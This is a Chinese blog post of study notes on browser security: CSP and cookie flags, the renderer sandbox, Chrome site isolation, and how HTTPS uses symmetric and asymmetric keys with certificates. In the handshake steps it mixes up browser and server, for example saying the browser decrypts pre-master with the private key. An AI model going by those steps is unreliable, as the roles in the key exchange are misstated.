+<p>其实页面的安全问题主要就是同源策略开了两个小口：页面可以加载任意第三方资源，另外一个是通过 CORS 策略可以让 XMLHttpRequest 和 Fetch 去跨域请求资源</p>
+
+<p>我们引入 CSP 来限制页面加载任意资源，引入 httpOnly 机制禁止 XMLHttpRequest 或者 Fetch 发送一些关键 Cookie，引入 sameSite 防止 CSRF 攻击</p>
+
+<h1 id="沙盒页面和系统之间的隔离墙">沙盒：页面和系统之间的隔离墙</h1>
+
+<p>浏览器架构如果影响到操作系统安全的</p>
+
+<p>浏览器的一些漏洞如果没有及时修复被黑客利用，就比如缓冲区溢出问题，不过和 xss 攻击是不同的</p>
+
+<ul>
+  <li>xss 只是把恶意脚本注入到网页，虽然能窃取 cookie，但是无法对系统作出攻击</li>
+  <li>浏览器的漏洞攻击可以入侵到浏览器进程内部，读取和修改浏览器进程内部的任意内容，穿透浏览器，在用户操作系统上安装恶意软件，监听用户键盘输入，读取硬盘内容</li>
+</ul>
+
+<p>这类攻击无疑是非常可怕的</p>
+
+<h2 id="安全视角下的多进程架构">安全视角下的多进程架构</h2>
+
+<p>现代浏览器的目标是安全快速和稳定，它们在设计的时候也考虑到了这类安全问题</p>
+
+<p><img src="/img/posts/browser/safe/3.png" alt="" /></p>
+
+<p>浏览器被划分为渲染内核和浏览器内核，浏览器内核是由网络进程，浏览器主进程和 GPU 组成的，渲染内核就是渲染进程</p>
+
+<p>网络资源通过浏览器内核下载，然后资源通过 IPC 提交给渲染进程。渲染进程解析绘制这些资源，生成图片等。但是渲染进程也不负责把图片显示到页面上，最终生成的图片提交给浏览器内核模块，负责显示这张图片</p>
+
+<p>化为不同的进程是为了增加稳定性，那么</p>
+
+<ul>
+  <li>为什么需要浏览器内核请求资源，把数据给渲染进程，而不从进程内部请求呢</li>
+  <li>渲染进程只负责生成图片，还要通过 IPC 通知浏览器内核，让浏览器内核来显示图片呢</li>
+</ul>
+
+<p>我们需要从系统安全的角度来分析</p>
+
+<h2 id="安全沙盒">安全沙盒</h2>
+
+<p>由于渲染进程需要解析 HTML，CSS，网络图片解码等，如果渲染进程存在系统级别的漏洞，以上操作可能让恶意站点获取到渲染进程的控制权限，进而获取操作系统的控制权限，这样非常危险</p>
+
+<p>网络资源存在各种可能，浏览器默认所有资源都不可信，但是不能确保没有漏洞，出现了漏洞黑客就可以通过内容进行攻击</p>
+
+<p>如果下载了一个恶意软件没有运行那是没问题的，浏览器的网络内容也是这样，浏览器安全下载各种资源，但是如果需要如解析 HTML、解析 CSS、执行 JavaScript、图片编解码等操作就需要非常小心了，否则会被黑客利用发起攻击</p>
+
+<p>所以操作系统和渲染进程之间建了一道墙，渲染进程即使被漏洞攻击了，黑客也无法获取渲染进程以外的操作系统权限。这道隔离的墙就是安全沙盒</p>
+
+<p>所以渲染进程无法获取和修改操作系统的数据，需要访问系统资源的时候，让浏览器内核实现，通过 IPC 转发给渲染进程</p>
+
+<h2 id="安全沙盒如何影响各个模块功能">安全沙盒如何影响各个模块功能</h2>
+
+<p>安全沙盒最小的保护单位是进程，限制进程对操作系统数据的修改和访问，如果需要安全沙盒运行在某个进程上，这个进程不能进行读写操作系统的操作，比如读写文件，发送网络请求，调用 GPU 接口等</p>
+
+<p><img src="/img/posts/browser/safe/4.png" alt="" /></p>
+
+<p>我们分析下渲染进程和浏览器内核各自的责任</p>
+
+<p>渲染进程需要沙盒保护，内部涉及到的系统交互功能都转移到了浏览器内核来实现</p>
+
+<p>安全沙盒是如何影响到各个模块的？</p>
+
+<h3 id="持久存储">持久存储</h3>
+
+<p>安全沙盒需要渲染进程无法直接访问用户的文件系统，但是渲染进程需要访问 cookie，上传文件的需求。浏览器把这些读写文件的操作都放到了浏览器内核去实现，通过 IPC 把结果返回给渲染进程</p>
+
+<ul>
+  <li>浏览器内核存放了一个所有 cookie 的 cookie 数据库，渲染进程获取 cookie 的时候，通过 IPC 发送读取 cookie 的请求给浏览器内核，浏览器内核读取以后通过 IPC 返回给渲染进程</li>
+  <li>渲染进程无法直接访问网络，浏览器在处理 URL 地址的时候会告诉渲染进程是否有权限请求这个 URL，比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，HTTPS 站点中是否有 HTTP 请求</li>
+</ul>
+
+<h3 id="用户交互功能">用户交互功能</h3>
+
+<p>通常的 UI 程序，提供了一个界面给你，运行用户与程序交互，允许程序在界面上绘制，比如 Windows 提供的是 HWND，Linux 提供的 X Window，把它们统称为窗口句柄，程序可以在上面绘制和接收键盘鼠标消息</p>
+
+<p>但是因为沙盒的存在渲染进程无法操作窗口句柄，限制了渲染进程读取用户输入的消息</p>
+
+<p>所以渲染进程需要有下面的改变</p>
+
+<ul>
+  <li>渲染进程需要渲染出位图，把这些位图发送给浏览器内核，浏览器内核再把它们绘制到屏幕上</li>
+  <li>操作系统没有把鼠标键盘消息传给渲染进程，直接传给了浏览器内核，浏览器内核根据浏览器的状态判断如何调度这些事件，确定是否转发给渲染进程</li>
+</ul>
+
+<h2 id="站点隔离">站点隔离</h2>
+
+<p>站点隔离指的是 Chrome 把同一站点（相同的跟域名和协议）放到同一个渲染进程</p>
+
+<p>一开始是以标签来划分渲染进程的，但是一个标签页可能存在多个 iframe，这些 iframe 又来自不同的站点，导致不同站点的内容通过 iframe 运行在了同一个渲染进程中</p>
+
+<p>所有操作系统都面临着两个 A 级漏洞——幽灵（Spectre）和熔毁（Meltdown），这两个漏洞是由处理器架构导致的，很难修补</p>
+
+<p>黑客通过漏洞直接进入到进程内部，如果没有沙盒保护，可以对操作系统进行攻击</p>
+
+<p>一个银行站点如果包含了恶意 iframe，黑客利用 A 级漏洞入侵渲染进程，恶意程序可以读取银行站点渲染进程内的所有内容了，这样风险很大</p>
+
+<p>Chrome 于是进行了 iframe 级别的渲染进程，严格按照同一站点策略分配渲染进程，这就是 Chrome 内的站点隔离策略</p>
+
+<p>这样就可以把恶意的 iframe 限制在它自己的渲染进程内，无法访问其他 iframe 的进程内容了</p>
+
+<p>2019 年 10 月 20 日 Chrome 团队宣布安卓版的 Chrome 已经全面支持站点隔离</p>
+
+<h1 id="https让数据传输更安全">HTTPS：让数据传输更安全</h1>
+
+<p>网络安全协议 HTTPS</p>
+
+<p>起初设计 HTTP 很简单就是传输超文本文件，没有加密的需求，所以一直是明文传输的</p>
+
+<p>这样在传输过程中数据可能被窃取或者篡改，这个意味着服务器和浏览器之间还有个中间人，中间人完全掌握了你的一切通信内容</p>
+
+<p><img src="/img/posts/browser/safe/5.png" alt="" /></p>
+
+<p>我们的 HTTP 传输内容很容易被窃取，伪造和篡改，就被叫做中间人攻击</p>
+
+<p>HTTP 把数据交给了 TCP 传输后经过电脑（电脑有恶意的软件，抓去篡改 HTTP 请求内容），Wi-Fi 路由器（黑客使用的钓鱼 Wi-Fi），运营商和目标服务器，每个环节都可能被攻击。</p>
+
+<h2 id="在-http-协议栈中引入安全层">在 HTTP 协议栈中引入安全层</h2>
+
+<p>我们可以在 TCP 和 HTTP 直接加入一个安全层，所有数据都要进行加密和解密</p>
+
+<p><img src="/img/posts/browser/safe/6.png" alt="" /></p>
+
+<p>所以 HTTPS 不是一个新的协议，HTTP 直接和 TCP 交互，而 HTTPS 先和安全层交互，安全层再和 TCP 层交互，不会影响到其他。我们要去了解安全层是如何工作的</p>
+
+<p>主要有两个指责：对发起 HTTP 请求的数据进行加密操作，对收到的 HTTP 请求数据进行解密操作</p>
+
+<h3 id="第一版-使用对称加密">第一版 使用对称加密</h3>
+
+<p>对称加密指的是加密和解密都用相同的密钥</p>
+
+<p>我们来实现第一版的 HTTPS</p>
+
+<p>在两台电脑上进行加解密操作，我们需要直到密钥是什么。所以 HTTPS 发送前浏览器和服务器需要协商用的加密方法和密钥</p>
+
+<p><img src="/img/posts/browser/safe/7.png" alt="" /></p>
+
+<p>上图知道首先需要协商加解密的方式，这是 HTTPS 建立安全连接的方法。为了让密钥难以破解，让服务器和浏览器同时决定密钥</p>
+
+<ul>
+  <li>浏览器发送它支持的加密套件列表（能支持的加密方法列表），和一个随机的 client-random，</li>
+  <li>服务器从公加密套件列表选择一个，生成一个随机的 server-random，把这两个返回给浏览器</li>
+  <li>浏览器和服务器分别返回确认信息</li>
+</ul>
+
+<p>现在浏览器和服务器都有相同的 client-random 和 server-random 了，然后使用相同的方式把 client-random 和 serve-random 混合起来形成一个密钥 master secret，有了这个密钥和加密套件，就可以进行加密传输了</p>
+
+<p>这里存在的问题是 client-random 和 server-random 都是明文传输的，黑客是能够拿到套件和双方的随机数，而利用随机合成密钥的方法也是公开的，黑客也能拿到密钥，还是可以破解的，使用这个密钥来窃听和伪造数据</p>
+
+<h3 id="第二版-使用非对称加密">第二版 使用非对称加密</h3>
+
+<p>非对称加密算法有 A，B 两把钥匙，如果你用 A 来加密，那只能用 B 来进行解密，如果用 B 来加密，只能用 A 来解密</p>
+
+<p>HTTPS 里面会把其中一个密钥明文的方式传给浏览器，把这个叫做公钥，自己留下的叫做私钥。公钥谁都可以拿到，私钥只有服务器自己知道</p>
+
+<p><img src="/img/posts/browser/safe/8.png" alt="" /></p>
+
+<ul>
+  <li>浏览器发送加密套件列表给服务器</li>
+  <li>服务器选择一个加密套件，和公钥一起返回给浏览器</li>
+  <li>浏览器和服务器各自确认</li>
+</ul>
+
+<p>那么发送数据的时候，浏览器通过公钥来加密内容，这些内容只有私钥可以解开，所以黑客即使知道了公钥和数据，也无法解开。</p>
+
+<p>但是</p>
+
+<ul>
+  <li>非对称加密效率太低，严重影响加解密的速度，进而影响用户打开页面的速度</li>
+  <li>无法保证服务器发送给浏览器的数据安全：浏览器可以用公钥加密，而服务器只能用私钥加密，私钥加密只有公钥可以解开，黑客也能获取到公钥，所以也能解开，这样无法保证服务器发送的内容是安全的</li>
+</ul>
+
+<h3 id="第三版-对称加密和非对称加密结合">第三版 对称加密和非对称加密结合</h3>
+
+<ul>
+  <li>传输数据阶段用对称加密</li>
+  <li>对称加密的密钥通过非对称加密来传输</li>
+</ul>
+
+<p><img src="/img/posts/browser/safe/9.png" alt="" /></p>
+
+<ul>
+  <li>浏览器向服务器发送对称加密套件列表，非对称加密套件列表，和随机数 client-random</li>
+  <li>服务器保持 client-random，选择对称加密套件和非对称加密套件，生成随机的 server-random，向浏览器发送加密套件， server-random 和公钥</li>
+  <li>浏览器保持公钥，使用 client-random, server-random 计算出 pre-master，然后利用公钥对 pre-master 加密，发送加密后的数据给浏览器</li>
+  <li>浏览器用私钥解出 pre-master，返回确认消息</li>
+</ul>
+
+<p>这样浏览器和服务器都有了 client-random, server-random 和 pre-master，浏览器和服务器用他们随机生成对称密钥，他们用同一套方法生成密钥，所以会是相同的</p>
+
+<p>有个对称密钥双方就可以使用它来传输数据了</p>
+
+<p>pre-master 是经过公钥加密的，黑客无法获取到 per-master，那么就无法生成密钥，那也无法破解传输的内容了</p>
+
+<h3 id="添加数字证书">添加数字证书</h3>
+
+<p>但是还是存在问题，比如我们要打开一个正常网站，黑客劫持了 DNS 把正常网站的 IP 换成了黑客网站 IP，我们于是访问黑客网站的服务器，黑客可以去实现公钥和私钥，浏览器并不知道在访问黑客网站</p>
+
+<p>于是怎么证明 我就是我 呢</p>
+
+<p>比如买房子，房管局提交你的材料，银行流水，银行证明，身份证等，房管局的人确认无误以后，给你一个房产证，有你的名字，身份证，实际面积，公摊面积</p>
+
+<p>我们之所以能证明房子是我的，因为有一个房管局这个权威的机构，它会给你发布一个证书</p>
+
+<p>浏览器的数字证书有两个用处：</p>
+
+<ul>
+  <li>向浏览器证明服务器的身份</li>
+  <li>保护了服务器的公钥</li>
+</ul>
+
+<p><img src="/img/posts/browser/safe/10.png" alt="" /></p>
+
+<p>这里主要修改了两点：</p>
+
+<ul>
+  <li>服务器没有直接返回公钥，而是返回了数字证书，公钥是包含在数字证书里面的</li>
+  <li>浏览器需要验证数字证书是否正确，然后进行后面的操作</li>
+</ul>
+
+<p>所以我们加上了服务器认证的步骤，黑客即使伪造了服务器，证书是无法伪造的，所以无法欺骗用户</p>
+
+<h2 id="数字证书的申请验证">数字证书的申请验证</h2>
+
+<h3 id="如何申请证书">如何申请证书</h3>
+
+<ul>
+  <li>准备一套公钥和密钥</li>
+  <li>向 CA 机构提交公钥，公司，站点信息并等待认证</li>
+  <li>CA 通过各种方法验证信息的真实性</li>
+  <li>通过审核以后，发放数字证书，包括公钥，组织信息，CA 信息，有效期，证书序列号，这些是明文的，以及一个 CA 的签名</li>
+</ul>
+
+<p>CA 使用哈希函数算法计算提交的明文信息，得出信息摘要，CA 再使用它的私钥对信息进行加密，加密后的密文就是 CA 发布的数字签名，这个是有办法去进行验证的（比如房产证的盖章是可以验证的）</p>
+
+<h3 id="浏览器如何验证数字证书">浏览器如何验证数字证书</h3>
+
+<p>浏览器发起请求时候，服务器会返回数字证书给浏览器，浏览器会对其进行验证</p>
+
+<p>首先读取相关的明文信息，使用 CA 签名时一样的哈希函数算法得到信息摘要 A，利用对应 CA 的公钥解开签名数据，得到信息摘要 B，对比信息摘要 A 和 B，如果一样的话就认为是一致合法的。同时还会验证有效时间等</p>
+
+<p>这个时候验证了 CA 是谁，但是有可能 CA 比较小众，浏览器不确认是否信任，它会继续查找给这个 CA 颁布证书的 CA，再继续验证它上级 CA 的可靠性。一般浏览器会内置顶级 CA 的信息，包含了公钥。如果一直到了顶级都无法找到，会被判定为非法（。。感觉有点像原型链。。最后返回 undefined）</p>
+
+<p>最后保证：</p>
+
+<ul>
+  <li>私钥不需要提供，自己保存</li>
+  <li>数字证书最核心的 CA 使用私钥来生成数字签名</li>
+  <li>内置 CA 对应的证书叫做根证书，最具有权威性的，为自己签名，叫做自签名证书</li>
+</ul>
+
+
+        <hr style="visibility: hidden;" />
+        <ul class="pager">
+          
+          <li class="previous">
+            <a
+              href="/2021/03/21/browser-working-principle/"
+              data-toggle="tooltip"
+              data-placement="top"
+              title="《浏览器工作原理与实践》系列笔记 - 宏观视觉上的浏览器"
+            >
+              Previous<br />
+              <span>《浏览器工作原理与实践》系列笔记 - 宏观视觉上的浏览器</span>
+            </a>
+          </li>
+           
+          <li class="next">
+            <a
+              href="/2021/03/23/browser-working-principle-js/"
+              data-toggle="tooltip"
+              data-placement="top"
+              title="《浏览器工作原理与实践》系列笔记 - 浏览器中的JavaScript执行机制"
+            >
+              Next<br />
+              <span>《浏览器工作原理与实践》系列笔记 - 浏览器中的JavaScript执行机制</span>
+            </a>
+          </li>
+          
+        </ul>
+        <hr style="visibility: hidden;" />
+
+        
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+          <div id="disqus_thread" class="disqus-thread"></div>
+        </div>
+        <!-- disqus 评论框 end -->
+         
+      </div>
+
+      <!-- Side Catalog Container -->
+      
+      <div
+        class="col-lg-2 col-lg-offset-0 visible-lg-block sidebar-container catalog-container"
+      >
+        <div class="side-catalog">
+          <hr class="hidden-sm hidden-xs" />
+          <h5>
+            <a class="catalog-toggle" href="#">CATALOG</a>
+          </h5>
+          <ul class="catalog-body"></ul>
+        </div>
+      </div>
+      
+
+      <!-- Sidebar Container -->
+      <div
+        class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 sidebar-container"
+      >
+        <!-- Featured Tags -->
+        
+
+
+<section>
+    
+        <hr class="hidden-sm hidden-xs">
+    
+    <h5><a href="/archive/">FEATURED TAGS</a></h5>
+    <div class="tags">
+        
+        
+        
+        
+        
+        
+                <a data-sort="0074" 
+                    href="/archive/?tag=Regular"
+                    title="Regular"
+                    rel="4">Regular</a>
+        
+                <a data-sort="0038" 
+                    href="/archive/?tag=LeetCode"
+                    title="LeetCode"
+                    rel="40">LeetCode</a>
+        
+                <a data-sort="0068" 
+                    href="/archive/?tag=Process"
+                    title="Process"
+                    rel="10">Process</a>
+        
+                <a data-sort="0071" 
+                    href="/archive/?tag=browser"
+                    title="browser"
+                    rel="7">browser</a>
+        
+                <a data-sort="0076" 
+                    href="/archive/?tag=JavaScript"
+                    title="JavaScript"
+                    rel="2">JavaScript</a>
+        
+                <a data-sort="0076" 
+                    href="/archive/?tag=Performance"
+                    title="Performance"
+                    rel="2">Performance</a>
+        
+                <a data-sort="0076" 
+                    href="/archive/?tag=V8"
+                    title="V8"
+                    rel="2">V8</a>
+        
+                <a data-sort="0076" 
+                    href="/archive/?tag=Vue"
+                    title="Vue"
+                    rel="2">Vue</a>
+        
+                <a data-sort="0076" 
+                    href="/archive/?tag=life"
+                    title="life"
+                    rel="2">life</a>
+    </div>
+</section>
+
+
+        <!-- Friends Blog -->
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+<!-- add support for mathjax by voleking-->
+  
+<!-- disqus 公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "cody1991-blog";
+  var disqus_identifier = "/2021/03/22/browser-working-principle-safe";
+  var disqus_url = "https://cody1991.cn/2021/03/22/browser-working-principle-safe/";
+
+  (function () {
+    var dsq = document.createElement("script");
+    dsq.type = "text/javascript";
+    dsq.async = true;
+    dsq.src = "//" + disqus_shortname + ".disqus.com/embed.js";
+    (
+      document.getElementsByTagName("head")[0] ||
+      document.getElementsByTagName("body")[0]
+    ).appendChild(dsq);
+  })();
+</script>
+<!-- disqus 公共JS代码 end -->
+ 
+<!-- async load function -->
+<script>
+  function async(u, c) {
+    var d = document,
+      t = "script",
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener(
+        "load",
+        function (e) {
+          c(null, e);
+        },
+        false
+      );
+    }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+  async(
+    "//cdn.bootcdn.net/ajax/libs/anchor-js/1.1.1/anchor.min.js",
+    function () {
+      anchors.options = {
+        visible: "hover",
+        placement: "right",
+        // icon: '#'
+      };
+      anchors
+        .add()
+        .remove(".intro-header h1")
+        .remove(".subheading")
+        .remove(".sidebar-container h5");
+    }
+  );
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <!-- SNS Link -->
+                
+
+
+<ul class="list-inline text-center">
+
+
+  
+  
+  <li>
+    <a href="https://twitter.com/cody19910828">
+      <span class="fa-stack fa-lg">
+        <i class="fa fa-circle fa-stack-2x"></i>
+        <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+    </a>
+  </li>
+  
+  
+  <li>
+    <a target="_blank" href="https://www.zhihu.com/people/cody1991">
+      <span class="fa-stack fa-lg">
+        <i class="fa fa-circle fa-stack-2x"></i>
+        <i class="fa  fa-stack-1x fa-inverse">知</i>
+      </span>
+    </a>
+  </li>
+  
+  
+  <li>
+    <a target="_blank" href="http://weibo.com/cody1991">
+      <span class="fa-stack fa-lg">
+        <i class="fa fa-circle fa-stack-2x"></i>
+        <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+      </span>
+    </a>
+  </li>
+  
+  
+  <li>
+    <a target="_blank" href="https://www.facebook.com/zexiong.tang">
+      <span class="fa-stack fa-lg">
+        <i class="fa fa-circle fa-stack-2x"></i>
+        <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+      </span>
+    </a>
+  </li>
+  
+  
+  <li>
+    <a target="_blank" href="https://github.com/cody1991">
+      <span class="fa-stack fa-lg">
+        <i class="fa fa-circle fa-stack-2x"></i>
+        <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+    </a>
+  </li>
+  
+  
+</ul>
+
+                <p class="copyright text-muted">
+                    Copyright &copy; cody1991 2021
+                    <br>
+                    Powered by <a href="http://huangxuan.me">Hux Blog</a> |
+                    <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="100px"
+                        height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=huxpro&repo=huxpro.github.io&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="//cdn.bootcdn.net/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<!-- Currently, only navbar scroll-down effect at desktop still depends on this -->
+<script src="//cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js "></script>
+
+<!-- Simple Jekyll Search -->
+<script src="//cdn.bootcdn.net/ajax/libs/simple-jekyll-search/1.7.12/simple-jekyll-search.min.js"></script>
+
+<!-- Service Worker -->
+
+<script src="/js/snackbar.js "></script>
+<script src="/js/sw-registration.js "></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+        var d = document, t = 'script',
+            o = d.createElement(t),
+            s = d.getElementsByTagName(t)[0];
+        o.src = u;
+        if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+        s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!--
+     Because of the native support for backtick-style fenced code blocks
+     right within the Markdown is landed in Github Pages,
+     From V1.6, There is no need for Highlight.js,
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/
+     - https://github.com/jneen/rouge/wiki/list-of-supported-languages-and-lexers
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+
+
+
+
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcdn.net/ajax/libs/fastclick/1.0.6/fastclick.min.js", function () {
+        var $nav = document.querySelector("nav");
+        if ($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+<!-- Side Catalog -->
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        // interop with multilangual 
+        if ('' == 'true') {
+            _containerSelector = 'div.post-container.active'
+        } else {
+            _containerSelector = 'div.post-container'
+        }
+
+        // init
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        // clean
+        $(selector).html('')
+
+        // appending
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    // toggle side catalog
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    /*
+     * Doc: https://github.com/davist11/jQuery-One-Page-Nav
+     * Fork by Hux to support padding
+     */
+    async("//cdn.bootcdn.net/ajax/libs/jquery-one-page-nav/3.0.0/jquery.nav.min.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+<!-- Multi-Lingual -->
+
+
+<!-- Simple Jekyll Search -->
+<script>
+    // https://stackoverflow.com/questions/1912501/unescape-html-entities-in-javascript
+    function htmlDecode(input) {
+        var e = document.createElement('textarea');
+        e.innerHTML = input;
+        // handle case of empty input
+        return e.childNodes.length === 0 ? "" : e.childNodes[0].nodeValue;
+    }
+
+    SimpleJekyllSearch({
+        searchInput: document.getElementById('search-input'),
+        resultsContainer: document.getElementById('search-results'),
+        json: '/search.json',
+        searchResultTemplate: '<div class="post-preview item"><a href="{url}"><h2 class="post-title">{title}</h2><h3 class="post-subtitle">{subtitle}</h3><hr></a></div>',
+        noResultsText: 'No results',
+        limit: 50,
+        fuzzy: false,
+        // a hack to get escaped subtitle unescaped. for some reason, 
+        // post.subtitle w/o escape filter nuke entire search.
+        templateMiddleware: function (prop, value, template) {
+            if (prop === 'subtitle' || prop === 'title') {
+                if (value.indexOf("code")) {
+                    return htmlDecode(value);
+                } else {
+                    return value;
+                }
+            }
+        }
+    });
+
+    $(document).ready(function () {
+        var $searchPage = $('.search-page');
+        var $searchOpen = $('.search-icon');
+        var $searchClose = $('.search-icon-close');
+        var $searchInput = $('#search-input');
+        var $body = $('body');
+
+        $searchOpen.on('click', function (e) {
+            e.preventDefault();
+            $searchPage.toggleClass('search-active');
+            var prevClasses = $body.attr('class') || '';
+            setTimeout(function () {
+                $body.addClass('no-scroll');
+            }, 400)
+
+            if ($searchPage.hasClass('search-active')) {
+                $searchClose.on('click', function (e) {
+                    e.preventDefault();
+                    $searchPage.removeClass('search-active');
+                    $body.attr('class', prevClasses);  // from closure 
+                });
+                $searchInput.focus();
+            }
+        });
+    });
+</script>
+
+
+<!-- Image to hack wechat -->
+<img src="/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
